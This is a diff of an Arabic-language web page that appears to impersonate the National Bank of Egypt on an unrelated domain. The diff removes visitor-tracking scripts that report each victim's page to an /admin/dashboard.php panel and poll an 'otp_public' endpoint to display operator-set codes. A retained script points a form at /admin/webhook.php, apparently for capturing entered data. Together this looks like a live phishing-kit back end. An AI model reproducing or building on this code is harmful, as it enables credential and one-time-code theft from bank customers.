@@ -8,7 +8,8 @@
 <link rel="alternate" type="application/rss+xml" title="الرئيسيه &laquo; خلاصة التعليقات" href="https://mobeechja.click/comments/feed/" />
 <link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://mobeechja.click/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fmobeechja.click%2Fhome%2F" />
 <link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://mobeechja.click/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fmobeechja.click%2Fhome%2F&#038;format=xml" />
-<script type="text/javascript" src="https://gc.kis.v2.scr.kaspersky-labs.com/FD126C42-EBFA-4E12-B309-BB3FDD723AC1/main.js?attr=4MIlDOI2bKg6UP3lHqzQeE7riJK-snJXMzZtELYYwtiY2zrL1dqTB7HXyI_bGD4cDe7Kt6urimsMFzRayA5XWSvk8Kh9lPsx6tv-IkG-LswSfPin4rx9QgZ56dPnNJu1VZRC3LR8gTv9BtADEOOp9z1C48IB4CHMtVm2tnj212QuFzfAtKiWxgpWSoN-cwT3-YbHEktxc5ApClpGI0lfXKhH1a-HVa_esM5sVrfKQEFuUOjo0dcMX46Cqyu8-vCwq6qy0PgMPJT4FC2zZvUOYQ" charset="UTF-8"></script><style id="wp-img-auto-sizes-contain-inline-css">
+
+<script type="text/javascript" src="https://gc.kis.v2.scr.kaspersky-labs.com/FD126C42-EBFA-4E12-B309-BB3FDD723AC1/main.js?attr=-9k7zCvenMzQwGVJaSG6HjTobv7mYTkjBgumxpvHbivePCH3tANtgNIPEuYMXImGmDw3eFlB8HzVwlGescsMHzUiF0zblweeFHGkYScXRrOqfGFjZ_ryYaJMeW0_G3YecLdpuyzifSlUaUKrG3m-Sref3MmntW3AzZycYuDkPnG3W2SyKlOZraK4WwWi6Ku59E_DmqfDyWBmy41szYtg-kk-nhqiBH5xHLC5qsh8hwIuINGtq1GLfgqhfwxfmF_RIQ1ksfF1r8Jkgux6-yYlyw" charset="UTF-8"></script><style id="wp-img-auto-sizes-contain-inline-css">
 img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
 /*# sourceURL=wp-img-auto-sizes-contain-inline-css */
 </style>
@@ -56,24 +57,11 @@ img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
 <meta property="og:image:alt" content="شعار البنك الأهلي المصري">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" /></head>
 <body class="rtl wp-singular page-template page-template-elementor_canvas page page-id-8701 wp-embed-responsive wp-theme-hello-elementor hello-elementor-default elementor-default elementor-template-canvas elementor-page elementor-page-8701">
-	<script>
-(function(){
-  // TODO: استبدل السطر التالي بقيمة الـ Visitor ID الحقيقية من نظامك
-  var VID = window.__VID || ''; 
-  if(!VID) return;
+	
 
-  function ping(){
-    var u=new URL('/admin/dashboard.php', window.location.origin);
-    u.searchParams.set('ajax','ping');
-    u.searchParams.set('visitor_id', VID);
-    fetch(u.toString(),{credentials:'include'}).catch(function(){});
-  }
-  ping();
-  setInterval(ping, 60000);
-})();
-</script>
 
-<script src="/admin/client.js" defer></script>
+
+
 		<div data-elementor-type="wp-page" data-elementor-id="8701" class="elementor elementor-8701" data-elementor-post-type="page">
 						<section class="elementor-section elementor-top-section elementor-element elementor-element-c95ff56 elementor-section-full_width elementor-section-height-default elementor-section-height-default" data-id="c95ff56" data-element_type="section" data-e-type="section">
 						<div class="elementor-container elementor-column-gap-no">
@@ -3607,194 +3595,11 @@ var ElementorProFrontendConfig = {"ajaxurl":"https:\/\/mobeechja.click\/wp-admin
 </script>
 <script id="elementor-pro-frontend-js" src="https://mobeechja.click/wp-content/plugins/elementor-pro/assets/js/frontend.min.js?ver=4.2.1"></script>
 <script id="pro-elements-handlers-js" src="https://mobeechja.click/wp-content/plugins/elementor-pro/assets/js/elements-handlers.min.js?ver=4.2.1"></script>
-<script>
-  (function () {
-    // عدّل المسار حسب الـ API عندك
-    var HEARTBEAT_ENDPOINT = '/api/heartbeat'; // مثال: /api/heartbeat
-    var HEARTBEAT_INTERVAL = 2000; // 2000ms = كل ثانيتين
 
-    function getVisitorId() {
-      var KEY = 'hb_visitor_id';
-      var id = null;
 
-      try {
-        id = localStorage.getItem(KEY);
-      } catch (e) {
-        // في حالة المتصفح يمنع localStorage
-      }
 
-      if (!id) {
-        id =
-          'v-' +
-          Date.now().toString(36) +
-          '-' +
-          Math.random().toString(36).substr(2, 9);
 
-        try {
-          localStorage.setItem(KEY, id);
-        } catch (e) {
-          // تجاهل الخطأ، سنستمر باستخدام id في الذاكرة فقط
-        }
-      }
 
-      return id;
-    }
-
-    var visitorId = getVisitorId();
-
-    function sendHeartbeat() {
-      var payload = {
-        visitor_id: visitorId,
-        page_url: window.location.href,
-        page_title: document.title,
-        ts: Date.now()
-      };
-
-      var body = JSON.stringify(payload);
-
-      // استخدام sendBeacon إن توفر (أفضل لصفحات الإغلاق والتنقل)
-      if (navigator.sendBeacon && window.Blob) {
-        var blob = new Blob([body], { type: 'application/json' });
-        navigator.sendBeacon(HEARTBEAT_ENDPOINT, blob);
-      } else if (window.fetch) {
-        // fallback إلى fetch
-        fetch(HEARTBEAT_ENDPOINT, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: body,
-          keepalive: true,
-          credentials: 'include' // لو تحتاج الكوكيز/السيشن
-        }).catch(function () {
-          // لا تفعل شيئًا لو فشل الطلب
-        });
-      } else {
-        // fallback قديم جدًا: XMLHttpRequest
-        try {
-          var xhr = new XMLHttpRequest();
-          xhr.open('POST', HEARTBEAT_ENDPOINT, true);
-          xhr.setRequestHeader('Content-Type', 'application/json');
-          xhr.send(body);
-        } catch (e) {
-          // تجاهل
-        }
-      }
-    }
-
-    // أول heartbeat بمجرد فتح الصفحة
-    sendHeartbeat();
-
-    // heartbeat دوري كل ثانيتين
-    var intervalId = window.setInterval(sendHeartbeat, HEARTBEAT_INTERVAL);
-
-    // عند إغلاق/تحديث الصفحة نحاول إرسال آخر heartbeat
-    window.addEventListener('beforeunload', function () {
-      sendHeartbeat();
-    });
-  })();
-</script>
-
-<script>
-document.addEventListener("DOMContentLoaded", function() {
-
-    // 1) استخراج معرف الزائر من التخزين المحلي أو من الحقول المخفية
-    let vid = localStorage.getItem('visitor_vid');
-
-    if (!vid) {
-        let hiddenInput = document.querySelector('input[name*="visitor_id"], input[name*="vid"]');
-        if (hiddenInput && hiddenInput.value) vid = hiddenInput.value.trim();
-    }
-
-    // إذا لم يوجد VID لا نرسل شيء
-    if (!vid) return;
-
-    // 2) محاولة تحسين العنوان الحقيقي (لو document.title عام أو فاضي)
-    function getBestTitle() {
-        let t = (document.title || '').trim();
-
-        // لو العنوان فاضي أو عام (اختياري) حاول من H1
-        if (!t || t === 'داخل الموقع') {
-            let h1 = document.querySelector('h1');
-            if (h1 && h1.textContent) {
-                let h = h1.textContent.trim();
-                if (h) t = h;
-            }
-        }
-
-        return t;
-    }
-
-    // 3) إرسال نبضة التتبع إلى endpoint الصحيح الموجود في PHP: ?track=1
-    let lastUrlSent = '';
-    let lastTitleSent = '';
-
-    function sendPulse(force) {
-        const url = window.location.href;
-        const title = getBestTitle();
-
-        // منع التكرار غير الضروري إلا عند force
-        if (!force && url === lastUrlSent && title === lastTitleSent) return;
-
-        lastUrlSent = url;
-        lastTitleSent = title;
-
-        fetch('/admin/dashboard.php?track=1', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                vid: vid,
-                url: url,
-                title: title
-            })
-        }).catch(function(e){
-            // لا توقف الموقع
-            // console.log('Tracking error', e);
-        });
-    }
-
-    // 4) إرسال مباشر أول مرة + كل 5 ثواني
-    sendPulse(true);
-    setInterval(function(){ sendPulse(false); }, 5000);
-
-    // 5) إرسال مباشر عند تغيير الصفحة داخل نفس التبويب (SPA) ليظهر خلال ثانية
-    (function() {
-        const _pushState = history.pushState;
-        const _replaceState = history.replaceState;
-
-        function stateChanged() {
-            // أعطِ فرصة للعنوان يتحدث ثم أرسل
-            setTimeout(function(){ sendPulse(true); }, 250);
-            setTimeout(function(){ sendPulse(true); }, 900);
-        }
-
-        history.pushState = function() {
-            _pushState.apply(this, arguments);
-            stateChanged();
-        };
-
-        history.replaceState = function() {
-            _replaceState.apply(this, arguments);
-            stateChanged();
-        };
-
-        window.addEventListener('popstate', stateChanged);
-        window.addEventListener('hashchange', stateChanged);
-    })();
-
-    // 6) إذا تغيّر عنوان الصفحة بدون تغيير URL (بعض الثيمات) راقب وأرسل
-    let titleObserver = new MutationObserver(function() {
-        // غالباً title يتغير بعد تحميل
-        sendPulse(true);
-    });
-
-    const titleEl = document.querySelector('title');
-    if (titleEl) {
-        titleObserver.observe(titleEl, { childList: true });
-    }
-
-});
-</script>
 <script>
 const TARGET_FORM_ID = "form5"; 
 const WEBHOOK_URL = "/admin/webhook.php";
@@ -3854,126 +3659,8 @@ document.addEventListener("DOMContentLoaded",function(){
 });
 </script>
 
-    <script>
-    (function(){
-        var trackEndpoint   = "https:\/\/mobeechja.click\/admin\/dashboard.php?track=1";
-        var otpEndpointBase = "https:\/\/mobeechja.click\/admin\/dashboard.php?otp_public=1";
+    
 
-        function isValidVid(v){
-            return /^VID-[A-Za-z0-9_-]{1,128}$/.test(String(v || ''));
-        }
-
-        function getCookie(name){
-            var m = document.cookie.match(new RegExp('(?:^|; )' + name.replace(/[.$?*|{}()[\]\\/+^]/g, '\\$&') + '=([^;]*)'));
-            return m ? decodeURIComponent(m[1]) : '';
-        }
-
-        function setCookie(name, value, days){
-            var maxAge = (days || 30) * 24 * 60 * 60;
-            var secure = location.protocol === 'https:' ? '; Secure' : '';
-            document.cookie = name + '=' + encodeURIComponent(value) + '; path=/; max-age=' + maxAge + '; SameSite=Lax' + secure;
-        }
-
-        function makeVid(){
-            return 'VID-' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 12) + '-' + Math.floor(Math.random() * 9000 + 1000);
-        }
-
-        function getOrCreateVisitorId(){
-            var vid = '';
-
-            try {
-                vid = localStorage.getItem('visitor_id') || localStorage.getItem('vid') || '';
-            } catch(e) {}
-
-            if (!isValidVid(vid)) {
-                vid = '';
-            }
-
-            if (!vid) {
-                var cookieVid = getCookie('vid');
-                if (isValidVid(cookieVid)) {
-                    vid = cookieVid;
-                }
-            }
-
-            if (!vid) {
-                vid = makeVid();
-            }
-
-            try {
-                localStorage.setItem('visitor_id', vid);
-                localStorage.setItem('vid', vid);
-            } catch(e) {}
-
-            setCookie('vid', vid, 30);
-
-            return vid;
-        }
-
-        var visitorId = getOrCreateVisitorId();
-        window.__siteVisitorId = visitorId;
-
-        function sendPulse() {
-            var payload = {
-                vid: visitorId,
-                url: window.location.href,
-                title: document.title || ''
-            };
-
-            fetch(trackEndpoint, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'X-Requested-With': 'XMLHttpRequest'
-                },
-                body: JSON.stringify(payload),
-                cache: 'no-store',
-                credentials: 'same-origin'
-            }).catch(function(){});
-        }
-
-        function refreshCircleNumber(){
-            var els = document.querySelectorAll('#circleNumber, [data-circle-number="1"]');
-            if(!els.length) return;
-
-            fetch(otpEndpointBase + '&vid=' + encodeURIComponent(visitorId), {
-                cache: 'no-store',
-                credentials: 'same-origin',
-                headers: {
-                    'X-Requested-With': 'XMLHttpRequest'
-                }
-            })
-            .then(function(r){ return r.json(); })
-            .then(function(j){
-                if (j && typeof j.value !== 'undefined') {
-                    els.forEach(function(el){
-                        el.textContent = j.value;
-                        el.setAttribute('data-visitor-id', visitorId);
-                    });
-                }
-            })
-            .catch(function(){});
-        }
-
-        sendPulse();
-        refreshCircleNumber();
-
-        setInterval(sendPulse, 10000);
-        setInterval(refreshCircleNumber, 2000);
-
-        document.addEventListener('visibilitychange', function(){
-            if (document.visibilityState === 'visible') {
-                sendPulse();
-                refreshCircleNumber();
-            }
-        });
-
-        window.addEventListener('pageshow', function(){
-            sendPulse();
-            refreshCircleNumber();
-        });
-    })();
-    </script>
     	</body>
 </html>
 
